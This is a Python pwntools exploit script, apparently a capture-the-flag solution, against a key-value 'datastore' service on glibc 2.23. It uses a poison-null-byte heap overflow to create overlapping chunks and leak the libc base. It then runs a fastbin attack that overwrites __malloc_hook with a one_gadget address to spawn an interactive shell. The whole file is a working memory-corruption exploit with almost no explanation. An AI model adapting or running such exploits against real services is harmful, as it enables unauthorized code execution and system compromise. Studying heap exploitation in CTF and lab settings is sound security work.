from pwn import *

io = remote('127.0.0.1', 10001)		# io = process("./datastore_223")
libc = ELF('/usr/local/glibc-2.23/lib/libc-2.23.so')

def PUT(key, size, data):
	io.sendlineafter("command:", "PUT")
	io.sendlineafter("key", key)
	io.sendlineafter("size", str(size))
	io.sendlineafter("data", data)

def GET(key):
	io.sendlineafter("command:", "GET")
	io.sendlineafter("key", key)
	io.recvuntil("bytes]:\n")
	return io.recvline()

def DEL(key):
	io.sendlineafter("command:", "DEL")
	io.sendlineafter("key", key)

for i in range(0, 10):
	PUT(str(i), 0x38, str(i)*0x37)
for i in range(0, 10):
	DEL(str(i))

def leak_libc():
	global libc_base

	PUT("A", 0x71, "A"*0x70)
	PUT("B", 0x101, "B"*0x100)
	PUT("C", 0x81, "C"*0x80)
	PUT("def", 0x81, "d"*0x80)

	DEL("A")
	DEL("B")
	PUT("A"*0x78, 0x11, "A"*0x10)		# posion null byte

	PUT("B1", 0x81, "X"*0x80)
	PUT("B2", 0x41, "Y"*0x40)
	DEL("B1")
	DEL("C")							# overlap chunkB2

	PUT("B1", 0x81, "X"*0x80)
	libc_base = u64(GET("B2")[:8]) - 0x39bb78
	log.info("libc address: 0x%x" % libc_base)

def pwn():
	one_gadget = libc_base + 0x3f44a
	malloc_hook = libc.symbols['__malloc_hook'] + libc_base

	DEL("B1")
	payload  = p64(0)*16 + p64(0) + p64(0x71)
	payload += p64(0)*12 + p64(0) + p64(0x21)
	PUT("B1", 0x191, payload.ljust(0x190, "B"))

	DEL("B2")
	DEL("B1")
	payload = p64(0)*16 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
	PUT("B1", 0x191, payload.ljust(0x190, "B"))

	PUT("D", 0X61, "D"*0x60)
	payload = p8(0)*0x13 + p64(one_gadget)
	PUT("E", 0X61, payload.ljust(0x60, "E"))

	io.sendline("GET")
	io.interactive()

if __name__ == '__main__':
	leak_libc()
	pwn()
